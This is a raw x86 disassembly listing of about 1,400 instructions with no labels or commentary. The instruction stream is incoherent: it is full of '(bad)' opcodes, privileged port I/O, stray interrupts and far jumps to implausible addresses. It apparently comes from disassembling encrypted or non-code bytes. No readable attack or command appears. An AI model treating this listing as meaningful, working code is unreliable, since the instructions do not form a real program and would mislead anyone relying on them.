  412d47:	add    bh,al
  412d49:	or     ecx,edx
  412d4b:	(bad)  
  412d4d:	mov    esp,0xe0fefb03
  412d52:	(bad)
  412d55:	jecxz  0x412d1e
  412d57:	mov    esp,0xdfb4faee
  412d5c:	sar    cl,cl
  412d5e:	mov    ebx,0xd1dfb4ff
  412d63:	not    ebx
  412d65:	mov    esp,0xd9d6e4c7
  412d6a:	add    al,cl
  412d6c:	fucomi st,st(1)
  412d6e:	or     cl,bh
  412d70:	clc    
  412d71:	add    dh,BYTE PTR [edx-0x3c334157]
  412d77:	int    0xe0
  412d79:	jmp    0xe3d1:0xc5c8bbe9
  412d80:	add    edi,DWORD PTR [edi-0x2d043143]
  412d86:	out    0xd0,al
  412d88:	(bad)  
  412d89:	test   DWORD PTR [ecx],0xe1cadedb
  412d8f:	hlt    
  412d90:	fsubrp st(4),st
  412d92:	scas   al,BYTE PTR es:[edi]
  412d93:	ret    0xadbc
  412d96:	shl    dh,1
  412d98:	rcl    esi,cl
  412d9a:	mov    ecx,0xd6d1ecd9
  412d9f:	jmp    0xbff3:0xd803efbf
  412da6:	fild   WORD PTR [ebx+edx*8]
  412da9:	fadd   st(5),st
  412dab:	pop    es
  412dac:	dec    edx
  412dae:	cli    
  412daf:	mov    cl,0x8
  412db2:	mov    bl,0xdf
  412db4:	mul    BYTE PTR [ebp+eiz*8-0x3a1d0e18]
  412dbb:	mov    eax,0xddcddbbf
  412dc0:	idiv   DWORD PTR [esi-0x3e001134]
  412dc6:	hlt    
  412dc7:	mov    ebp,0xfcc7f804
  412dcc:	out    dx,eax
  412dcd:	out    dx,al
  412dce:	sti    
  412dcf:	clc    
  412dd0:	stc    
  412dd1:	jmp    0xade4:0xc2c9bfa9
  412dd8:	shl    bh,1
  412dda:	shl    esi,0xcd
  412ddd:	fsubp  st(4),st
  412ddf:	mov    edx,0xc8dbb4c3
  412de4:	repz loopne 0x412dc3
  412de7:	jmp    0x412db4
  412de9:	fdivrp st(7),st
  412deb:	fldpi  
  412ded:	clc    
  412dee:	or     cl,bl
  412df0:	add    dh,bh
  412df2:	repz ret 
  412df4:	iret   
  412df5:	(bad)  
  412df7:	test   ecx,0xcfb6c6c0
  412dfd:	mov    bh,0xfb
  412dff:	jecxz  0x412df7
  412e01:	sti    
  412e02:	xlat   BYTE PTR ds:[ebx]
  412e03:	sti    
  412e04:	jmp    edx
  412e06:	fsub   st,st(4)
  412e08:	inc    dh
  412e0a:	(bad)  
  412e0b:	aad    0xc9
  412e0d:	iret   
  412e0e:	jmp    0xd2a6:0xb8dc07e1
  412e15:	mov    dh,0xe6
  412e17:	lods   eax,DWORD PTR ds:[esi]
  412e18:	(bad)  
  412e19:	rcl    bl,cl
  412e1b:	repz mov ch,0xd7
  412e1e:	jmp    0x412dd2
  412e20:	jmp    0x412def
  412e22:	mov    ebp,0xc2bcf1e3
  412e27:	cmc    
  412e28:	fcomp  st(1)
  412e2a:	fucomp st(2)
  412e2c:	(bad)  
  412e2e:	cmc    
  412e2f:	loopne 0x412df5
  412e31:	out    0xee,al
  412e33:	shr    ecx,0xe1
  412e36:	in     eax,0xeb
  412e38:	sti    
  412e39:	ror    ch,0xb2
  412e3c:	(bad)  
  412e3e:	(bad)  
  412e3f:	repz int3 
  412e41:	mov    al,0xe2
  412e43:	(bad)  
  412e44:	int    0xcc
  412e46:	rol    ebx,1
  412e48:	(bad)  
  412e49:	jmp    0xc8eb:0xfcdccad1
  412e50:	clc    
  412e51:	add    ecx,eax
  412e53:	mov    esi,0xb5cae1e3
  412e58:	loopne 0x412e1e
  412e5a:	aad    0xca
  412e5c:	mov    edi,0xd2f1e4f1
  412e61:	ret    
  412e62:	cld    
  412e63:	ffreep st(1)
  412e65:	cld    
  412e66:	push   es
  412e67:	aad    0xfa
  412e69:	pop    es
  412e6a:	loopne 0x412e47
  412e6c:	out    0xcb,al
  412e6e:	in     al,dx
  412e6f:	inc    DWORD PTR [ebx]
  412e71:	in     eax,0xa8
  412e73:	mov    esi,0xc0eec4d7
  412e78:	icebp  
  412e79:	mov    bh,0xf6
  412e7b:	xlat   BYTE PTR ds:[ebx]
  412e7c:	shr    bh,1
  412e7e:	in     al,0xc4
  412e80:	mov    eax,0xbdd0ceee
  412e85:	int    0xfc
  412e87:	sar    ch,0x2
  412e8a:	mul    ecx
  412e8c:	jmp    0x412e62
  412e8e:	or     esp,esp
  412e90:	repz cli 
  412e92:	shr    BYTE PTR [ecx-0x301e1154],1
  412e98:	loope  0x412e42
  412e9a:	mov    ah,0xc9
  412e9c:	mul    ebp
  412e9e:	rcr    edx,1
  412ea0:	hlt    
  412ea1:	call   0x63afe83
  412ea6:	fcomip st,st(7)
  412ea8:	(bad)  
  412ea9:	(bad)  
  412eaa:	vpavgw xmm4,xmm3,xmm2
  412eae:	sti    
  412eaf:	enter  0xde5,0xbe
  412eb3:	repz shr ebx,0xcf
  412eb7:	(bad)
  412eba:	stc    
  412ebb:	enter  0xc9d3,0xd1
  412ebf:	jecxz  0x412e7c
  412ec1:	iret   
  412ec2:	cli    
  412ec3:	sti    
  412ec4:	int    0x6
  412ec6:	out    0x1,al
  412ec8:	(bad)  
  412eca:	aad    0xfc
  412ecc:	(bad)  
  412ecd:	fld    DWORD PTR [edx]
  412ecf:	ficom  WORD PTR [edx]
  412ed1:	out    0xab,al
  412ed3:	into   
  412ed4:	mov    edi,0xfab6c3cd
  412ed9:	out    dx,al
  412eda:	out    dx,al
  412edb:	stc    
  412edc:	retf   
  412edd:	lods   al,BYTE PTR ds:[esi]
  412ede:	mov    bh,0xdc
  412ee0:	repz int 0xc8
  412ee3:	loopne 0x412e9d
  412ee5:	out    dx,al
  412ee6:	xlat   BYTE PTR ds:[ebx]
  412ee7:	sti    
  412ee8:	mov    ecx,0xe6ebc5ca
  412eed:	push   es
  412eee:	fisttp QWORD PTR [eax]
  412ef0:	bswap  eax
  412ef2:	repnz xlat BYTE PTR ds:[ebx]
  412ef4:	in     eax,0xb6
  412ef6:	jmp    0x412ecf
  412ef8:	test   eax,0xf7f1f7d6
  412efd:	iret   
  412efe:	(bad)  
  412f00:	mov    ch,0xb4
  412f02:	fcmovu st,st(3)
  412f04:	ror    esp,cl
  412f06:	in     eax,dx
  412f07:	add    eax,0xc9c2c2c3
  412f0c:	std    
  412f0d:	or     bl,ah
  412f0f:	retf   0xf1fd
  412f12:	in     eax,0xf1
  412f14:	repz shr DWORD PTR [esi-0x4c3e442f],cl
  412f1b:	jmp    0x412eef
  412f1d:	mov    eax,0x3bbfff4
  412f22:	fdiv   st,st(1)
  412f24:	sar    ebp,1
  412f26:	rcr    cl,cl
  412f28:	loope  0x412f01
  412f2a:	ret    
  412f2b:	or     bl,ch
  412f2d:	(bad)
  412f30:	les    ecx,FWORD PTR [ebx]
  412f32:	(bad)  [eax-0x1548321a]
  412f38:	mov    bl,0xe9
  412f3a:	mov    cl,0xd7
  412f3c:	mov    eax,0xc3bef3b5
  412f41:	std    
  412f42:	mov    edi,0xf9f9faf2
  412f47:	fcmovnu st,st(1)
  412f49:	shl    esi,0xd8
  412f4c:	cli    
  412f4d:	loopne 0x412f1a
  412f4f:	int    0xdf
  412f51:	(bad)  
  412f53:	icebp  
  412f54:	int    0xc9
  412f56:	mov    al,0xee
  412f58:	in     eax,dx
  412f59:	mov    ebx,0xdfcdcddb
  412f5e:	mov    ah,0xdf
  412f60:	xlat   BYTE PTR ds:[ebx]
  412f61:	rol    cl,1
  412f63:	mov    dh,0xd3
  412f65:	shl    esp,cl
  412f67:	out    0xc5,eax
  412f69:	or     dh,bh
  412f6b:	in     eax,0x1
  412f6d:	(bad)  
  412f6e:	push   cs
  412f6f:	aam    0xe1
  412f71:	icebp  
  412f72:	shl    bl,1
  412f74:	iret   
  412f75:	fisubr WORD PTR [esi-0x380c2f56]
  412f7b:	mov    ch,0xcb
  412f7d:	(bad)  
  412f7e:	std    
  412f7f:	fdivp  st(4),st
  412f81:	ret    
  412f82:	in     eax,dx
  412f83:	mov    ebp,0xb01f4bf
  412f88:	out    0xf1,al
  412f8a:	aam    0xdc
  412f8c:	cld    
  412f8d:	fimul  WORD PTR [ebx+ebx*8]
  412f90:	leave  
  412f91:	leave  
  412f92:	rcl    dl,1
  412f94:	lock enter 0xc7c8,0xe7
  412f99:	mov    dl,0xca
  412f9b:	jmp    0xbe212a8d
  412fa0:	fcomi  st,st(2)
  412fa2:	add    dl,bl
  412fa4:	iret   
  412fa5:	(bad)  
  412fa6:	ffree  st(4)
  412fa8:	push   es
  412fa9:	out    0xfc,al
  412fab:	mov    DWORD PTR [edi],0xcffdfbcf
  412fb1:	or     esi,eax
  412fb3:	(bad)
  412fb6:	ror    ebp,0xe9
  412fb9:	jmp    0xeaf6:0xc8f7c0e8
  412fc0:	mov    ebp,0xf5f7efea
  412fc5:	(bad)  
  412fc6:	cli    
  412fc7:	stc    
  412fc8:	repz out 0xe6,eax
  412fcb:	or     esp,eax
  412fcd:	retf   0xcbc8
  412fd0:	jmp    0x412f9a
  412fd2:	iret   
  412fd3:	out    0xcb,eax
  412fd5:	lock mov al,0xe5
  412fd8:	int3   
  412fd9:	fnstenv [eax-0x251b0d2e]
  412fdf:	not    eax
  412fe1:	iret   
  412fe2:	sar    BYTE PTR [esi-0x74033fd],cl
  412fe8:	shl    esi,cl
  412fea:	leave  
  412feb:	cli    
  412fec:	(bad)  
  412fed:	out    dx,eax
  412fee:	out    0xf8,eax
  412ff0:	in     al,0xa
  412ff2:	in     al,dx
  412ff3:	in     al,0xe2
  412ff5:	mov    al,0xac
  412ff7:	mov    esp,0xe5c9e0e9
  412ffc:	rcl    cl,cl
  412ffe:	mov    eax,0xdeceedf9
  413003:	(bad)  
  413005:	stc    
  413006:	std    
  413007:	hlt    
  413008:	idiv   bl
  41300a:	loopne 0x41300d
  41300c:	mov    ebp,0xa0bdccb
  413011:	adc    ebp,edx
  413013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413014:	shr    BYTE PTR [esi-0xb2a044a],cl
  41301a:	out    0xb9,al
  41301c:	ffreep st(5)
  41301e:	cli    
  41301f:	mov    esp,0xe1c3b4ce
  413024:	add    DWORD PTR [ebp-0x2143944],edi
  41302a:	sar    bl,0xe0
  41302d:	fisttp QWORD PTR [esp+ebx*8]
  413030:	leave  
  413031:	retf   
  413032:	scas   al,BYTE PTR es:[edi]
  413033:	lock in eax,0xf3
  413036:	cmc    
  413037:	shl    DWORD PTR [edi-0x35153739],1
  41303d:	hlt    
  41303e:	int    0xe8
  413040:	(bad)  
  413041:	mov    edi,0xfcd4e2b7
  413046:	hlt    
  413047:	neg    al
  413049:	dec    DWORD PTR [edx]
  41304b:	add    bh,ah
  41304d:	push   cs
  41304e:	inc    DWORD PTR [edx]
  413050:	cld    
  413051:	shl    al,cl
  413053:	lock shl esi,0xeb
  413057:	xlat   BYTE PTR ds:[ebx]
  413058:	mov    ah,0xc1
  41305a:	scas   eax,DWORD PTR es:[edi]
  41305b:	in     eax,0xba
  41305d:	out    dx,al
  41305e:	in     eax,0xe9
  413060:	leave  
  413061:	add    edi,DWORD PTR [ecx-0x4040401f]
  413067:	add    eax,esi
  413069:	jmp    0x413036
  41306b:	loopne 0x413048
  41306d:	pmulhw mm1,QWORD PTR [edx]
  413070:	add    ecx,esi
  413072:	repnz loope 0x413028
  413075:	in     al,0xc5
  413077:	out    0xe0,eax
  413079:	rol    eax,1
  41307b:	mov    dh,0xc7
  41307d:	out    dx,eax
  41307e:	int3   
  41307f:	iret   
  413080:	call   0xda492c84
  413085:	rol    ebp,1
  413087:	mov    ebp,0xc9f9e3c3
  41308d:	jmp    0xe7f2:0xf304dffb
  413094:	into   
  413095:	loop   0x413053
  413097:	repz in eax,0xf5
  41309a:	hlt    
  41309b:	(bad)  
  41309c:	(bad)  
  41309d:	xlat   BYTE PTR ds:[ebx]
  41309e:	icebp  
  41309f:	aad    0xbe
  4130a1:	(bad)  
  4130a2:	jmp    0xd812058f
  4130a7:	jmp    ecx
  4130a9:	out    0x8,eax
  4130ab:	loope  0x41307c
  4130ad:	add    eax,DWORD PTR [ecx+ebp*8]
  4130b0:	add    al,0xd2
  4130b2:	retf   
  4130b3:	out    dx,al
  4130b4:	in     al,dx
  4130b5:	scas   eax,DWORD PTR es:[edi]
  4130b6:	jecxz  0x413087
  4130b8:	mov    bl,0xd6
  4130ba:	mov    dh,0xf5
  4130bc:	(bad)
  4130c0:	retf   
  4130c1:	fadd   st,st(1)
  4130c3:	pop    es
  4130c4:	add    al,BYTE PTR [ecx]
  4130c6:	stc    
  4130c7:	cmc    
  4130c8:	lock fild WORD PTR [edx]
  4130cb:	cld    
  4130cc:	out    0x9,eax
  4130ce:	in     al,dx
  4130cf:	out    0xa,eax
  4130d1:	push   cs
  4130d2:	mov    bl,0xa8
  4130d4:	iret   
  4130d5:	idiv   BYTE PTR [ebp-0x190d3a1d]
  4130db:	mov    ah,0xb0
  4130dd:	xlat   BYTE PTR ds:[ebx]
  4130de:	sar    bl,cl
  4130e0:	mov    ch,0xcf
  4130e2:	stc    
  4130e3:	add    DWORD PTR [edi-0x3f194009],edi
  4130e9:	retf   
  4130ea:	sar    ecx,1
  4130ec:	shl    ebp,0xfb
  4130ef:	retf   0xccde
  4130f2:	jecxz  0x4130b0
  4130f4:	enter  0xc9b3,0xb1
  4130f8:	imul   BYTE PTR [eax-0xb3b2908]
  4130fe:	call   0xe43bede2
  413103:	(bad)  
  413105:	(bad)  
  413107:	ror    ebx,1
  413109:	(bad)  
  41310a:	add    edi,esp
  41310c:	hlt    
  41310d:	loope  0x41311d
  41310f:	pextrw ebp,mm5,0xad
  413113:	(bad)  
  413114:	mov    esi,0xd4c8c0e4
  413119:	(bad)  
  41311a:	mov    cl,0xfb
  41311c:	not    bh
  41311e:	not    eax
  413120:	(bad)  
  413122:	mov    esp,0xf0c6bcd3
  413127:	in     al,0xde
  413129:	in     al,0xe3
  41312b:	rol    dh,0xda
  41312e:	les    ecx,FWORD PTR [ecx+ebp*8]
  413131:	add    eax,0xe9e7e5cb
  413136:	jmp    0xdc34062c
  41313b:	ror    bl,0xdb
  41313e:	bnd jmp 0x413131
  413141:	(bad)  
  413143:	mov    eax,0xfef0c7d2
  413148:	stc    
  413149:	stc    
  41314a:	(bad)  
  41314b:	call   0xfb0a1059
  413150:	cli    
  413151:	or     al,dl
  413153:	repz jmp 0xb11e284b
  413159:	int3   
  41315a:	jmp    0xd1100d1f
  41315f:	fdiv   st(1),st
  413161:	icebp  
  413162:	sti    
  413163:	lock xlat BYTE PTR ds:[ebx]
  413165:	lock (bad) 
  413168:	(bad)  
  41316a:	add    DWORD PTR [eax],ecx
  41316c:	push   ebp
  41316e:	push   es
  41316f:	add    cl,al
  413171:	loopne 0x413152
  413173:	repnz (bad) 
  413175:	jmp    0xce06202c
  41317a:	lock sar DWORD PTR [eax-0x110d032f],1
  413181:	xlat   BYTE PTR ds:[ebx]
  413182:	ret    0xf8b6
  413185:	hlt    
  413186:	mov    ebp,0xd1ebf8fe
  41318b:	cmc    
  41318c:	fdivrp st(4),st
  41318e:	int    0xfc
  413190:	add    dl,BYTE PTR [edx]
  413192:	mov    ecx,0xc8decfec
  413197:	shl    cl,cl
  413199:	shl    cl,0xb9
  41319c:	in     eax,dx
  41319d:	dec    bl
  41319f:	aam    0xfa
  4131a1:	fcmovb st,st(2)
  4131a3:	mov    edi,0xccf5fbcd
  4131a8:	jmp    0x4131a7
  4131aa:	(bad)  
  4131ac:	std    
  4131ad:	(bad)  
  4131af:	std    
  4131b0:	les    eax,FWORD PTR [edi]
  4131b2:	lods   al,BYTE PTR ds:[esi]
  4131b3:	test   eax,0xefb5e1c1
  4131b8:	int    0xba
  4131ba:	fcomi  st,st(4)
  4131bc:	out    0xd9,al
  4131be:	shl    DWORD PTR [ebp-0x421e440f],1
  4131c4:	(bad)  
  4131c6:	add    bl,ah
  4131c8:	cli    
  4131c9:	jmp    0x4131c4
  4131cb:	(bad)
  4131ce:	add    BYTE PTR [eax],al
  4131d0:	add    dh,ch
  4131d2:	mov    ebp,0xd7d3bedc
  4131d7:	icebp  
  4131d8:	mov    dh,0xc0
  4131da:	mov    bh,0xd2
  4131dc:	jmp    0xc1e9:0xfbcfdfcb
  4131e3:	loop   0x4131e4
  4131e5:	repz ret 0xcbf6
  4131e9:	inc    BYTE PTR [ecx]
  4131eb:	ret    0x3c8
  4131ee:	ret    
  4131ef:	add    ebp,ecx
  4131f1:	iret   
  4131f2:	in     al,0xb0
  4131f4:	fucom  st(7)
  4131f6:	loope  0x4131e8
  4131f8:	(bad)  
  4131f9:	aad    0xc8
  4131fb:	jmp    0xd62a1ec4
  413200:	xlat   BYTE PTR ds:[ebx]
  413201:	retf   0xdbda
  413204:	rcl    edi,0xfe
  413207:	imul   bl
  413209:	clc    
  41320a:	aam    0xfa
  41320c:	shr    dl,0xf
  41320f:	int    0xf9
  413211:	jmp    0xa528eaf5
  413216:	repz loopne 0x4131c9
  413219:	lods   al,BYTE PTR ds:[esi]
  41321a:	cmc    
  41321b:	out    dx,al
  41321c:	lock stc 
  41321e:	int    0xca
  413220:	mov    ebx,0xeef1b8f5
  413225:	(bad)  
  413227:	cld    
  413228:	or     cl,dl
  41322a:	inc    bh
  41322c:	add    dh,cl
  41322e:	(bad)
  413232:	retf   
  413233:	not    eax
  413235:	in     al,dx
  413236:	mov    esp,0xc0d2f1f0
  41323b:	rol    bh,cl
  41323d:	jmp    0x41322b
  41323f:	std    
  413240:	loop   0x413230
  413242:	fistp  QWORD PTR [esi-0x142d2e29]
  413248:	rol    BYTE PTR [ebx],1
  41324a:	or     ebp,edi
  41324c:	fld    QWORD PTR [ecx+eiz*8]
  41324f:	jecxz  0x41324f
  413251:	loop   0x413238
  413253:	shl    esi,1
  413255:	out    dx,al
  413256:	lods   al,BYTE PTR ds:[esi]
  413257:	retf   
  413258:	mov    cl,0xc1
  41325a:	(bad)  
  41325b:	lock mov al,0xd0
  41325e:	in     al,dx
  41325f:	add    edi,esi
  413261:	div    dh
  413263:	rcr    esi,0x2
  413266:	in     eax,dx
  413267:	(bad)  
  413268:	out    0xfb,al
  41326a:	clc    
  41326b:	not    dh
  41326d:	pop    es
  41326e:	out    0xdf,al
  413270:	fstp   st(5)
  413272:	out    0xcc,eax
  413274:	(bad)  
  413275:	test   ebx,0xd2f2d4b4
  41327b:	int3   
  41327c:	mov    cl,0xe5
  41327e:	mov    ah,0xdc
  413280:	ret    
  413281:	icebp  
  413282:	hlt    
  413283:	fcmovnb st,st(7)
  413285:	ret    
  413286:	push   es
  413287:	pop    es
  413288:	in     eax,0xf6
  41328a:	(bad)  
  41328b:	std    
  41328c:	out    dx,al
  41328d:	in     eax,0xf9
  41328f:	fmul   st(1),st
  413291:	fdivr  DWORD PTR [esi-0x36421d33]
  413297:	leave  
  413298:	mov    ch,0xe7
  41329a:	int    0xf1
  41329c:	(bad)  
  41329d:	mov    ebx,0xeecfcdb6
  4132a2:	cld    
  4132a3:	stc    
  4132a4:	rcl    edx,1
  4132a6:	out    0xdb,eax
  4132a8:	ret    0x4f0
  4132ab:	pop    es
  4132ac:	fcomi  st,st(6)
  4132ae:	retf   
  4132af:	fiadd  DWORD PTR [edi]
  4132b1:	pavgb  mm4,mm0
  4132b4:	shr    edx,0xea
  4132b7:	into   
  4132b8:	enter  0xf1ec,0xb9
  4132bc:	mov    ebx,0xffd3ffb7
  4132c1:	(bad)  
  4132c3:	mov    esp,0xc0f6fcfb
  4132c8:	fisttp DWORD PTR [edx]
  4132ca:	jecxz  0x4132ce
  4132cc:	(bad)  
  4132cd:	push   es
  4132ce:	add    dl,ah
  4132d0:	(bad)  
  4132d2:	out    0xbe,eax
  4132d4:	into   
  4132d5:	(bad)
  4132d9:	div    BYTE PTR [eax-0x42c320e]
  4132df:	lock std 
  4132e1:	iret   
  4132e2:	fnstsw WORD PTR [edx-0x41f9ff12]
  4132e8:	ret    
  4132e9:	fild   DWORD PTR [esi]
  4132eb:	neg    bh
  4132ed:	rol    BYTE PTR [esi],0xe8
  4132f0:	into   
  4132f1:	jmp    0xdd1003a9
  4132f6:	icebp  
  4132f7:	hlt    
  4132f8:	xlat   BYTE PTR ds:[ebx]
  4132f9:	mov    bh,0xc6
  4132fb:	mov    ecx,0xd1beeef5
  413300:	not    eax
  413302:	in     eax,dx
  413303:	loopne 0x4132fc
  413305:	clc    
  413306:	fnstcw WORD PTR [ebp-0x23091b0c]
  41330c:	retf   0xcb03
  41330f:	retf   
  413310:	add    ecx,DWORD PTR [eax]
  413312:	shl    edx,1
  413314:	mov    dl,0xd6
  413316:	mov    cl,0xca
  413318:	jmp    0xedff:0xadf2d2f6
  41331f:	cld    
  413320:	out    dx,al
  413321:	in     al,dx
  413322:	mov    esp,0xd1d9bdff
  413327:	(bad)  
  413329:	add    esp,esi
  41332b:	aad    0xfc
  41332d:	jmp    0x4132f2
  41332f:	in     eax,dx
  413330:	fmul   st,st(1)
  413332:	in     al,dx
  413333:	xlat   BYTE PTR ds:[ebx]
  413334:	lods   al,BYTE PTR ds:[esi]
  413335:	leave  
  413336:	(bad)  
  413337:	loope  0x41332c
  413339:	jmp    0xf238e927
  41333e:	jmp    0x41333b
  413340:	aam    0xde
  413342:	stc    
  413343:	clc    
  413344:	add    DWORD PTR [esp+ebx*8-0x3d0f1421],edi
  41334b:	sti    
  41334c:	add    bl,bl
  41334e:	out    dx,al
  41334f:	ffree  st(1)
  413351:	or     eax,0xedc7e4b9
  413356:	(bad)
  413359:	repz cmc 
  41335b:	mov    ah,0xb9
  41335d:	dec    dh
  41335f:	clc    
  413360:	jmp    0xd130373e
  413365:	(bad)  
  413367:	clc    
  413368:	std    
  413369:	push   esp
  41336b:	in     al,0xe5
  41336d:	hlt    
  41336e:	or     dh,ah
  413370:	or     cl,BYTE PTR [eax]
  413372:	out    0xc2,al
  413374:	iret   
  413375:	repz jecxz 0x413359
  413378:	leave  
  413379:	rcl    ecx,cl
  41337b:	out    dx,al
  41337c:	(bad)  
  41337e:	cld    
  41337f:	retf   
  413380:	add    edx,eax
  413382:	(bad)  
  413384:	stc    
  413385:	ret    
  413386:	fdiv   st(1),st
  413388:	xlat   BYTE PTR ds:[ebx]
  413389:	xlat   BYTE PTR ds:[ebx]
  41338a:	ret    
  41338b:	or     eax,ecx
  41338d:	ud0    ebp,edx
  413390:	out    0xd,al
  413392:	mov    edi,0xbcd5ebe9
  413397:	in     al,dx
  413398:	retf   0xb7d9
  41339b:	(bad)  
  41339c:	int    0xcf
  41339e:	hlt    
  41339f:	aad    0xff
  4133a1:	mov    edi,0x6fcc2c8
  4133a6:	lock fcomp st(0)
  4133a9:	sti    
  4133aa:	fisttp DWORD PTR [ecx]
  4133ac:	jmp    0xe84934b3
  4133b1:	add    ebp,eax
  4133b3:	in     eax,dx
  4133b4:	loopne 0x4133a3
  4133b6:	in     eax,0xe2
  4133b8:	ret    
  4133b9:	shl    dh,cl
  4133bb:	lock in al,dx
  4133bd:	out    dx,al
  4133be:	(bad)  
  4133bf:	(bad)  
  4133c1:	std    
  4133c2:	repz loope 0x4133b4
  4133c5:	call   edx
  4133c7:	jmp    0x4133a4
  4133c9:	in     eax,0xf7
  4133cb:	fld    DWORD PTR [eax]
  4133cd:	out    dx,eax
  4133ce:	pop    es
  4133cf:	int    0xce
  4133d1:	adc    al,ch
  4133d3:	into   
  4133d4:	rol    bh,1
  4133d6:	(bad)  
  4133d7:	iret   
  4133d8:	retf   0xe6f9
  4133db:	fidiv  DWORD PTR [esi-0x4a052247]
  4133e1:	(bad)  
  4133e2:	(bad)  
  4133e4:	jecxz  0x4133ac
  4133e6:	icebp  
  4133e7:	fscale 
  4133e9:	shl    al,1
  4133eb:	jecxz  0x4133d0
  4133ed:	add    al,0xe8
  4133ef:	fisttp DWORD PTR [edi]
  4133f1:	in     eax,dx
  4133f2:	(bad)  
  4133f3:	retf   
  4133f4:	out    0xe8,eax
  4133f6:	div    BYTE PTR [ebp-0x24301336]
  4133fc:	idiv   bl
  4133fe:	repnz leave 
  413400:	cmc    
  413401:	jecxz  0x413402
  413403:	ret    
  413404:	pop    es
  413405:	std    
  413406:	ffree  st(3)
  413408:	rol    edx,1
  41340a:	fcmovnb st,st(6)
  41340c:	add    bh,bl
  41340e:	into   
  41340f:	fcomp  st(6)
  413411:	dec    ebx
  413413:	mov    al,0xd7
  413415:	enter  0xefca,0xee
  413419:	(bad)  
  41341a:	in     al,0xc8
  41341c:	jmp    0xbdde:0xe3b9bff7
  413423:	mov    dh,0xbc
  413425:	loopne 0x413422
  413427:	ret    0xc2bc
  41342a:	add    eax,0xfeffc7c8
  41342f:	stc    
  413430:	(bad)  
  413431:	clc    
  413432:	loopne 0x413404
  413434:	jmp    0xcf3903e9
  413439:	ror    eax,cl
  41343b:	(bad)  
  41343c:	fucomi st,st(0)
  41343e:	jmp    0xeeff04f9
  413443:	loop   0x413408
  413445:	rol    DWORD PTR [ebx],cl
  413447:	clc    
  413448:	mov    ebp,0xcf09d9d8
  41344d:	mov    esp,0xae5e803
  413452:	retf   0xddf7
  413455:	loope  0x413443
  413457:	idiv   ebx
  413459:	lock (bad) 
  41345b:	mov    edx,0xebb3b4f4
  413460:	repnz iret 
  413462:	mov    ebx,0xc1e3c203
  413467:	lock rcl dh,cl
  41346a:	call   0xc525376c
  41346f:	add    ebp,ebx
  413471:	add    ah,dl
  413473:	loope  0x413428
  413475:	mov    al,0xe2
  413477:	jmp    0x41343a
  413479:	call   0xca3d0f77
  41347e:	(bad)  
  413480:	neg    dh
  413482:	out    dx,eax
  413483:	ret    
  413484:	loope  0x413487
  413486:	cld    
  413487:	lds    ecx,FWORD PTR [edx]
  413489:	(bad)  
  41348a:	or     DWORD PTR [ebx],ecx
  41348c:	inc    DWORD PTR [edi]
  41348e:	jecxz  0x413495
  413490:	or     ebp,esp
  413492:	rcl    bl,0xc4
  413495:	enter  0xe9f1,0xea
  413499:	cmc    
  41349a:	mov    bh,0xe7
  41349c:	int    0xe4
  41349e:	in     eax,0xd5
  4134a0:	fcmovne st,st(0)
  4134a2:	ror    ah,cl
  4134a4:	fiadd  DWORD PTR [ecx]
  4134a6:	ffreep st(3)
  4134a8:	push   es
  4134a9:	cli    
  4134aa:	out    0xfd,al
  4134ac:	or     ebx,eax
  4134ae:	push   es
  4134af:	in     al,0xff
  4134b1:	std    
  4134b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b3:	ret    
  4134b4:	lock loopne 0x41347f
  4134b7:	mov    dh,0xce
  4134b9:	mov    ch,0xf4
  4134bb:	aad    0xd9
  4134bd:	into   
  4134be:	imul   cl
  4134c0:	(bad)  
  4134c2:	aad    0xb9
  4134c4:	fabs   
  4134c6:	out    0xdd,al
  4134c8:	repnz mov esp,0xf0efec2
  4134ce:	jmp    0x413499
  4134d0:	fdivp  st(1),st
  4134d2:	int3   
  4134d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134d4:	fdivr  st(3),st
  4134d6:	mov    al,0xcc
  4134d8:	mov    ch,0xe7
  4134da:	cmc    
  4134db:	neg    bl
  4134dd:	in     eax,0xcc
  4134df:	fucomip st,st(5)
  4134e1:	std    
  4134e2:	hlt    
  4134e3:	(bad)  
  4134e4:	pop    es
  4134e5:	fidivr WORD PTR [edi-0x2e3d271b]
  4134eb:	fisttp DWORD PTR [ecx]
  4134ed:	paddusw mm1,mm6
  4134f0:	loopne 0x4134d7
  4134f2:	lods   al,BYTE PTR ds:[esi]
  4134f3:	repnz fucomip st,st(5)
  4134f6:	scas   al,BYTE PTR es:[edi]
  4134f7:	int3   
  4134f8:	shl    esi,cl
  4134fa:	rcr    ecx,cl
  4134fc:	(bad)  
  4134fd:	out    dx,eax
  4134fe:	call   0xdb3126eb
  413503:	int    0xd2
  413505:	loope  0x4134e2
  413507:	add    ebx,edx
  413509:	fiadd  WORD PTR [edx]
  41350b:	clc    
  41350c:	mov    al,0xc8
  41350f:	cli    
  413510:	loopne 0x4134f4
  413512:	mov    bl,0xdf
  413514:	fnsave [eax-0x4d11043b]
  41351a:	cmc    
  41351b:	sti    
  41351c:	xlat   BYTE PTR ds:[ebx]
  41351d:	(bad)  
  41351e:	(bad)  
  413520:	sar    BYTE PTR [edi-0x3c09110f],cl
  413526:	fnstsw WORD PTR [edx+0x3e1d8c1]
  41352c:	jmp    0xc3da:0xeecbdee9
  413533:	in     al,0xad
  413535:	jecxz  0x413519
  413537:	out    0xac,al
  413539:	mov    ah,0xc9
  41353b:	mov    ecx,0xccb4dfc5
  413540:	in     al,dx
  413541:	cmc    
  413542:	std    
  413543:	cmc    
  413544:	not    dh
  413546:	mov    edi,0x205c7fa
  41354b:	out    0xbd,eax
  41354d:	mov    DWORD PTR [esi],0xd90712e4
  413553:	loop   0x413502
  413555:	mov    cl,0xb7
  413557:	int3   
  413558:	int    0xf9
  41355a:	into   
  41355b:	out    0xc6,al
  41355d:	mov    ch,0xe9
  41355f:	hlt    
  413560:	imul   bh
  413562:	add    cl,dh
  413564:	neg    esp
  413566:	(bad)  
  413568:	(bad)  
  413569:	jecxz  0x413549
  41356b:	in     al,0xe7
  41356d:	syscall 
  41356f:	retf   
  413570:	cli    
  413571:	loope  0x413556
  413573:	ffree  st(5)
  413575:	ret    0xe2e5
  413578:	jmp    0x413544
  41357a:	mov    ebx,0xeaf5f9db
  41357f:	mov    ebx,0xe8d3c3ca
  413584:	std    
  413585:	(bad)  
  413587:	out    0xf2,al
  413589:	aad    0xc1
  41358b:	fsubr  st,st(0)
  41358d:	push   cs
  41358e:	jmp    0xdd0d425b
  413593:	loope  0x413542
  413595:	mov    bl,0xea
  413597:	mov    dl,0xb7
  413599:	fucomi st,st(0)
